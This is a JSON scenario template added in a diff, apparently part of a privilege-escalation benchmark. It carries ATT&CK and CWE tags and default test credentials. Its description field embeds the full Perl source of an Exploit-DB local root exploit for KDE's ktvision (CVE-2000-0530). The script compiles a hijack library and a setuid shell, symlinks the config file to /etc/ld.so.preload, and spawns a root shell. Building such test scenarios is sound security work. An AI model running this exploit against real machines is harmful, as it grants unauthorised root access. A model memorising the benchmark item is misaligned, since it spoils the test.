@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_19979",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: KDE 1.1.2 KApplication configfile - Local Privilege Escalation (1) (CVE-2000-0530;OSVDB-1372)\n\nExploit source code (19979.pl):\n```\n#source: https://www.securityfocus.com/bid/1291/info\n#\n#The KDE configuration-file management has a bug which could result in root compromise.\n#\n#Due to insecure creation of configuration (rc) files via KApplication-class, local users can modify ownership of arbitrary files when running setuid root KDE-programs.\n#\n#Properly exploited, this can permit a local attacker to change ownership of key system files, then write arbitrary data to them, allowing an elevation of privileges.\n\n#!/usr/bin/perl\n\n#\n# 7350ktvision! The ktvision-hack.\n#\n# Just execute. Gives instant rootshell kiddie!\n# If only ktvision is setuid-root and vulnerable as with\n# SuSE 6.4!\n#\n#\n# Bugdiscovery is due to Sebastian Krahmer.\n# http://www.cs.uni-potsdam.de/homepages/students/linuxer\n#\n# Greets as always to TESO, security.is, lam3rz ... you all\n# know who you are.\n#\n# Special greets to that beautiful black-dressed woman at\n# the bus stop. This one is for you. :)\n#\n\nmy $rcfile = $ENV{\"HOME\"}.\"/.kde/share/config/ktvisionrc\";\n\n$ENV{\"PATH\"}.=\":/opt/kde/bin\";\n\nprint \">>Get a feeling on GUI's and how secure they are.<< Stealth.\\n\";\n\nprint \"Creating hijack-lib ...\\n\";\nopen O, \">/tmp/boom.c\" or die \"open(boom.c..)\";\nprint O<<_EOF_;\n#include <sys/types.h>\n\nint time(void *v)\n{\n\tchown(\"/tmp/boomsh\", 0, 0);\n\tchmod(\"/tmp/boomsh\", 06755);\n\tunlink(\"/etc/ld.so.preload\");\n\texit(1);\n}\n_EOF_\nclose O;\n\nprint \"Compiling hijack-lib ...\\n\";\n`cc -c -fPIC /tmp/boom.c -o /tmp/boom.o`;\n`cc -shared /tmp/boom.o -o /tmp/boom.so`;\n\nopen O, \">/tmp/boomsh.c\" or die \"open(boomsh.c ...)\";\nprint O<<_EOF2_;\n#include <stdio.h>\nint main()\n{\n    char *a[] = {\"/bin/sh\", 0};\n    setuid(0); setregid(0, 0);\n    execve(a[0], a, 0);\n    return 0;\n}\n_EOF2_\nclose O;\n\nprint \"Compile shell ...\\n\";\n`cc /tmp/boomsh.c -o /tmp/boomsh`;\n\numask 0;\n\nunlink $rcfile;\nsymlink \"/etc/ld.so.preload\", $rcfile;\n\nprint \"Invoking vulnerable program (ktvision)...\\n\";\n\nif (fork() == 0) {\n\t`ktvision`;\n\texit 0;\n} else {\n\tsleep(3);\n\tkill 9, `pidof ktvision`;\n}\n\nopen O, \">/etc/ld.so.preload\" or die \"Huh? Can't open preload.\";\nprint O \"/tmp/boom.so\";\nclose O;\n`/usr/bin/passwd`;\n\n# let it look like if we have sth. to do. :)\nsleep 3;\nprint \"Welcome. But as always: BEHAVE!\\n\";\nsystem(\"/tmp/boomsh\");\n```",
+  "cve": "CVE-2000-0530;OSVDB-1372",
+  "exploitdb_id": "19979",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_19979",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
